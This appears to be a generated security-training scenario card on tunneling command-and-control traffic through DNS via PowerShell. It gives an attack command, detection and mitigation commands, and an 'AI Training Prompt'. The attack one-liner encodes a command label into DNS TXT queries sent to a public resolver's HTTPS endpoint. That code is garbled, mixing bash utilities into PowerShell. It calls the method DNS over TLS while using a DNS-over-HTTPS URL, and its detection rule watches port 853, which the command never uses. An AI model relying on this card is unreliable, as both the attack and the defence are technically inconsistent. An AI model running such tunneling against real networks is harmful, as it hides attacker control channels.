---
type: campaign
scenario_id: 417
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using PowerShell to tunnel C2 via DNS over TLS (DoT).

## Threat Description
Using PowerShell to tunnel C2 via DNS over TLS (DoT).

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://1.1.1.1/dns-query?name=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)&type=TXT -Method GET | Out-Null"
```

## Detection Logic
Monitor DoT traffic: `tshark -Y 'tcp.port == 853' | grep 1.1.1.1`; PowerShell DoT: `wmic process where name='powershell.exe' get commandline | findstr 1.1.1.1`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block DoT: `netsh advfirewall firewall add rule name='Block DoT' dir=out action=block remoteip=1.1.1.1,1.0.0.1`.

## AI Training Prompt
Train AI to detect PowerShell DoT-based DNS tunneling by analyzing HTTPS requests to DoT resolvers, base64-encoded subdomains, and TXT query patterns; suggest DoT blocking.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
